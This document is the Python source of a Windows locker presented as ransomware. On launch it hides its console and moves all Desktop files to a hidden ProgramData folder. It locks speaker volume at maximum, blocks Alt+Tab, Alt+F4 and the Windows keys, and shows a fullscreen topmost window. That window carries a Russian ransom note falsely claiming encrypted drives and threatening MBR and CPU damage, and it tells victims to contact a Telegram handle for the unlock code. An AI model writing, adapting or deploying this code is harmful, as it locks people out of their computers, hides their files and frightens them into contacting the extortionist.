# red_screen_art_left.pyw

import time
import threading
import tkinter as tk
import urllib.request
import io
import os
import sys
import socket
import winsound
import tempfile
import hashlib
import ctypes
import winreg
import subprocess
import shutil
from PIL import Image, ImageTk

# ============================================================
# ТОЧНАЯ КОПИЯ ВАШЕГО КОДА ЗВУКА
# ============================================================
from pycaw.pycaw import AudioUtilities

def lock_max_volume():
    # Инициализируем COM для этого потока (КРИТИЧНО ВАЖНО для pycaw)
    ctypes.windll.ole32.CoInitialize(None)
    
    try:
        device = AudioUtilities.GetSpeakers()
        volume = device.EndpointVolume
    except Exception as e:
        return

    try:
        while True:
            if volume.GetMute() == 1:
                volume.SetMute(0, None)
            
            if round(volume.GetMasterVolumeLevelScalar(), 2) < 1.0:
                volume.SetMasterVolumeLevelScalar(1.0, None)
                
            time.sleep(0.1)
    except KeyboardInterrupt:
        pass

# Подключаем надежную библиотеку для блокировки клавиш
try:
    import keyboard
    KEYBOARD_OK = True
except ImportError:
    KEYBOARD_OK = False

# ============================================================
# НАСТРОЙКИ
# ============================================================
PASSWORD = "1234"
IMAGE_URL = "https://raw.githubusercontent.com/f3ntezy/198598673426/main/Fentezy.png"
SOUND_URL = "https://raw.githubusercontent.com/f3ntezy/198598673426/main/fentezy.mp3"
PURPLE = "#5B168F"
DEVICE_NAME = socket.gethostname()
AUDIO_PATH = os.path.join(tempfile.gettempdir(), "fentezy_demo_sound.mp3")

DESKTOP_PATH = os.path.join(os.environ["USERPROFILE"], "Desktop")
TRASH_FOLDER = r"C:\ProgramData\Lol"

# ============================================================
# СКРЫТИЕ КОНСОЛИ И ЗАПУСК ЗВУКА
# ============================================================
def hide_console_window():
    try:
        kernel32 = ctypes.WinDLL('kernel32')
        user32 = ctypes.WinDLL('user32')
        hwnd = user32.FindWindowW(None, "C:\\WINDOWS\\py.exe")
        if hwnd: user32.ShowWindow(hwnd, 0)
        hwnd_console = kernel32.GetConsoleWindow()
        if hwnd_console: user32.ShowWindow(hwnd_console, 0)
    except: pass

hide_console_window()

# Принудительно выкручиваем на 100% прямо сейчас (в главном потоке)
try:
    from pycaw.pycaw import AudioUtilities
    dev = AudioUtilities.GetSpeakers()
    dev.EndpointVolume.SetMasterVolumeLevelScalar(1.0, None)
    dev.EndpointVolume.SetMute(0, None)
except:
    pass

# Запускаем ваш код в фоне
threading.Thread(target=lock_max_volume, daemon=True).start()

try:
    import pygame
    os.environ["PYGAME_HIDE_SUPPORT_PROMPT"] = "1"
    PYGAME_OK = True
except ImportError:
    PYGAME_OK = False

# ============================================================
# ФУНКЦИЯ ПЕРЕНОСА ФАЙЛОВ
# ============================================================
def encrypt_desktop():
    try:
        if not os.path.exists(TRASH_FOLDER):
            os.makedirs(TRASH_FOLDER, exist_ok=True)
        if not os.path.exists(DESKTOP_PATH): return

        for item in os.listdir(DESKTOP_PATH):
            if item.lower() in ("desktop.ini", "thumbs.db"): continue
            try: 
                shutil.move(os.path.join(DESKTOP_PATH, item), os.path.join(TRASH_FOLDER, item))
            except: pass

        note_path = os.path.join(DESKTOP_PATH, "Encrypted by @f3ntezy.txt")
        with open(note_path, "w", encoding="utf-8") as f: 
            f.write("Encrypted by @f3ntezy")
    except: pass

def restore_desktop():
    try:
        if not os.path.exists(TRASH_FOLDER): return
        note_path = os.path.join(DESKTOP_PATH, "Encrypted by @f3ntezy.txt")
        if os.path.exists(note_path):
            try: os.remove(note_path)
            except: pass
        for item in os.listdir(TRASH_FOLDER):
            try: 
                shutil.move(os.path.join(TRASH_FOLDER, item), os.path.join(DESKTOP_PATH, item))
            except: pass
    except: pass

def generate_pc_id():
    seed = f"{socket.gethostname()}-{time.time_ns()}-{os.urandom(8).hex()}"
    return f"10-{hashlib.md5(seed.encode()).hexdigest().upper()[:13]}"

# ============================================================
# ВИЗУАЛ (ПРИЛОЖЕНИЕ)
# ============================================================
class RedScreenArt:
    def __init__(self, root):
        self.root = root
        self.root.title("")
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        self.root.overrideredirect(True)
        self.root.configure(bg="black")

        self.root.update_idletasks()
        self.hwnd = ctypes.windll.user32.GetParent(self.root.winfo_id())
        if not self.hwnd: self.hwnd = self.root.winfo_id()

        self.password = PASSWORD
        self.id = generate_pc_id()
        self.is_unlocked = False
        self.photo_big = None
        self.sound_started = False

        self.root.protocol("WM_DELETE_WINDOW", self.on_close_attempt)

        self.boot_lines = [
            "Booting Windows  .  .  .",
            "Boot error: 0x03527737",
            "Boot error: 0x0266712",
            "Boot error: 0x02897593",
            "Boot error: 0x01447812",
            "Boot error: 0x0150974",
            "Boot error: 0x03873700",
            "Boot error: 0x0700882",
            "Boot error: 0x03803618",
            "Memory section at address 0x0424* is locked!",
            "Service UXCryptor started."
        ]
        self.current_line = 0

        if KEYBOARD_OK:
            for key in ['alt+tab', 'alt+f4', 'ctrl+esc', 'win', 'left windows', 'right windows']:
                try: keyboard.block_key(key)
                except: pass

        self.keep_focus_loop()
        threading.Thread(target=self.prepare_sound, daemon=True).start()
        self.show_image_screen()

    def on_close_attempt(self):
        if not self.is_unlocked:
            self.show_password_screen()

    def keep_focus_loop(self):
        if not self.is_unlocked:
            try:
                ctypes.windll.user32.SetForegroundWindow(self.hwnd)
                self.root.attributes("-topmost", True)
                if hasattr(self, 'pass_entry') and self.pass_entry.winfo_exists():
                    self.pass_entry.focus_set()
            except: pass
            self.root.after(50, self.keep_focus_loop)

    def prepare_sound(self):
        if not PYGAME_OK: return
        try:
            if not os.path.exists(AUDIO_PATH):
                request = urllib.request.Request(SOUND_URL, headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(request, timeout=30) as response:
                    with open(AUDIO_PATH, "wb") as file: file.write(response.read())
            if self.sound_started: return
            self.sound_started = True
            pygame.mixer.init()
            pygame.mixer.music.load(AUDIO_PATH)
            pygame.mixer.music.play(loops=0)
        except: pass

    def stop_sound(self):
        try:
            if PYGAME_OK and pygame.mixer.get_init():
                pygame.mixer.music.stop()
                pygame.mixer.quit()
        except: pass

    def fetch_image(self, size=(400, 400)):
        try:
            request = urllib.request.Request(IMAGE_URL, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(request, timeout=10) as response:
                image_data = response.read()
            original = Image.open(io.BytesIO(image_data))
            original.thumbnail(size)
            return ImageTk.PhotoImage(original)
        except: return None

    def show_image_screen(self):
        for widget in self.root.winfo_children(): widget.destroy()
        self.root.configure(bg="black")
        self.photo_big = self.fetch_image(size=(400, 400))
        image_label = tk.Label(self.root, bg="black")
        if self.photo_big is not None:
            image_label.configure(image=self.photo_big)
        else:
            image_label.configure(text="FENTEZY", fg="white", font=("Consolas", 32, "bold"))
        image_label.place(relx=0.5, rely=0.5, anchor="center")
        self.root.after(2000, self.show_boot_screen)

    def show_boot_screen(self):
        for widget in self.root.winfo_children(): widget.destroy()
        self.root.configure(bg="black")
        image_label = tk.Label(self.root, bg="black")
        if self.photo_big is not None:
            image_label.configure(image=self.photo_big)
        else:
            image_label.configure(text="FENTEZY", fg="white", font=("Consolas", 32, "bold"))
        image_label.place(relx=0.5, rely=0.5, anchor="center")
        self.boot_text = tk.Label(self.root, text="", bg="black", fg="white", font=("Consolas", 12), justify="left", anchor="nw")
        self.boot_text.place(x=30, y=25)
        self.current_line = 0
        self.add_white_line()

    def add_white_line(self):
        if self.current_line >= len(self.boot_lines):
            self.root.after(50, self.show_red_text)
            return
        self.boot_text.configure(text="\n".join(self.boot_lines[:self.current_line + 1]))
        self.current_line += 1
        self.root.after(40, self.add_white_line)

    def show_red_text(self):
        self.boot_text.configure(text="\n".join(self.boot_lines + ["", "* Windows blocked!"]), fg="#ff2020")
        self.root.after(100, self.show_art_screen)

    def show_art_screen(self):
        for widget in self.root.winfo_children(): widget.destroy()
        self.root.configure(bg=PURPLE)
        ascii_art = """
              ...
             ;::::;
           ;::::; :;
         ;:::::'   :;
        ;:::::;     ;.
       ,:::::'       ;           OOO
       ::::::;       ;          OOOOO
       ;:::::;       ;         OOOOOOOO
      ,;::::::;     ;'         / OOOOOOO
    ;:::::::::`. ,,,;.        /  / DOOOOOO
  .';:::::::::::::::::;,     /  /     DOOOO
,::::::;::::::;;;;::::;,   /  /        DOOOO
;::::::'::::::;;;::::: ,#/  /          DOOO
::::::::;::::::;;::: ;::#  /            DOOO
:::::::::;:::::::: ;::::# /              DOO
::::::::`;:::::: ;::::::#/               DOO
::::::::::;; ;:::::::::##                OO
:::::::::::;::::::::;:::#                OO
:::::::::::::::::;'`:;::#                O
  :::::::::::::;' /  / `:#
   :::::::::::;'  /  /   #
        """
        art_label = tk.Label(self.root, text=ascii_art, font=("Courier", 16), fg="white", bg=PURPLE, justify="left", anchor="nw")
        art_label.place(x=10, y=10, anchor="nw")
        self.root.after(700, self.show_password_screen)

    def show_password_screen(self):
        for widget in self.root.winfo_children(): widget.destroy()
        self.root.configure(bg="black")

        sw = self.root.winfo_screenwidth()
        sh = self.root.winfo_screenheight()
        container = tk.Frame(self.root, bg="black", width=min(sw - 100, 820), height=min(sh - 100, 520))
        container.place(relx=0.5, rely=0.5, anchor="center")

        title_frame = tk.Frame(container, bg="white")
        title_frame.pack(fill="x", padx=15, pady=(5, 20))
        tk.Label(title_frame, text="Ваши файлы зашифрованы", bg="white", fg="black", font=("Courier New", 14, "bold"), pady=4).pack(fill="x")

        message_frame = tk.Frame(container, bg="black", highlightbackground="#aaaaaa", highlightcolor="#aaaaaa", highlightthickness=2)
        message_frame.pack(fill="x", padx=15)
        message = (
            "Упс! Вы подверглись масштабной хакерской атаке и теперь ваш компьютер\n"
            "заблокирован, а все имеющиеся диски и файлы на них зашифрованы хакерской\n"
            "группировкой Fentezy. Любые действия, связанные с попыткой\n"
            "обмануть систему нанесут непоправимый вред вашему компьютеру и приведут\n"
            "к потере всех важных файлов без возможности восстановления. При попытке\n"
            "снять блокировку MBR (Главный загрузчик материнской платы) будет снесён и\n"
            "подана резервная нагрузка на ваш процессор, что приведёт к его\n"
            "неисправности. У вас есть 48 часов с момента запуска чтобы ввести код,\n"
            "чтобы получить код, напиши @f3ntezy (Telegram)"
        )
        tk.Label(message_frame, text=message, bg="black", fg="white", font=("Courier New", 10, "bold"), justify="center", padx=15, pady=12).pack(fill="both", expand=True)

        code_frame = tk.Frame(container, bg="black", highlightbackground="#aaaaaa", highlightcolor="#aaaaaa", highlightthickness=2)
        code_frame.pack(fill="x", padx=15, pady=(18, 0))
        tk.Label(code_frame, text="Введите код разблокировки:", bg="black", fg="white", font=("Courier New", 11, "bold")).pack(pady=(8, 6))

        self.pass_entry = tk.Entry(code_frame, bg="white", fg="black", insertbackground="black", font=("Courier New", 12), relief="flat", justify="center")
        self.pass_entry.pack(fill="x", padx=10, pady=(0, 10), ipady=3)
        self.pass_entry.bind("<Return>", self.check_password)
        self.pass_entry.bind("<KeyRelease>", self.filter_input)

        bottom = tk.Frame(container, bg="black")
        bottom.pack(fill="x", padx=15, pady=(12, 0))
        bottom.grid_columnconfigure(0, weight=1)
        bottom.grid_columnconfigure(1, weight=1)
        tk.Label(bottom, text=f"Current PC: {DEVICE_NAME}", bg="black", fg="white", font=("Courier New", 9, "bold")).grid(row=0, column=0, sticky="w")
        tk.Label(bottom, text="Enter [Ввод]", bg="black", fg="white", font=("Courier New", 9, "bold")).grid(row=0, column=1, sticky="e")

        tk.Label(self.root, text=f"ID: {self.id}", bg="black", fg="#aaaaaa", font=("Courier New", 9)).place(x=20, y=sh - 30)
        
        self.root.after(10, self.set_entry_focus)

    def set_entry_focus(self):
        try:
            self.root.focus_force()
            self.pass_entry.focus_set()
        except: pass

    def filter_input(self, event):
        current = self.pass_entry.get()
        filtered = "".join(c for c in current if c.isdigit())
        if filtered != current:
            self.pass_entry.delete(0, tk.END)
            self.pass_entry.insert(0, filtered)

    def check_password(self, event=None):
        pwd = self.pass_entry.get().strip()
        if pwd == self.password:
            self.pass_entry.config(fg="green")
            self.is_unlocked = True
            self.root.after(300, self.close_application)
        else:
            self.pass_entry.delete(0, tk.END)
            self.pass_entry.config(fg="red")
            try: winsound.Beep(200, 300)
            except: pass
            self.root.after(200, lambda: self.pass_entry.config(fg="black"))

    def close_application(self):
        self.is_unlocked = True
        if KEYBOARD_OK:
            try: keyboard.unhook_all()
            except: pass
            
        self.stop_sound()
        restore_desktop()
        
        try: self.root.destroy()
        except: pass

# ============================================================
# ЗАПУСК (СТРОГО КАК В ФАЙЛЕ)
# ============================================================
if __name__ == "__main__":
    # Запуск пустой консоли (как в вашем файле)
    subprocess.Popen('start /min "" cmd /c "pause"', shell=True)

    # Запускаем перенос файлов в фоне
    threading.Thread(target=encrypt_desktop, daemon=True).start()

    # Создаем невидимое окно-заглушку на 3 секунды
    root = tk.Tk()
    root.title("System")
    root.attributes("-alpha", 0.0) 
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.overrideredirect(True)
    root.configure(bg="black")

    def start_visual():
        root.destroy()
        new_root = tk.Tk()
        app = RedScreenArt(new_root)
        app.root.mainloop()

    # Запускаем визуал через 3000 мс (3 секунды)
    root.after(3000, start_visual)
    root.mainloop()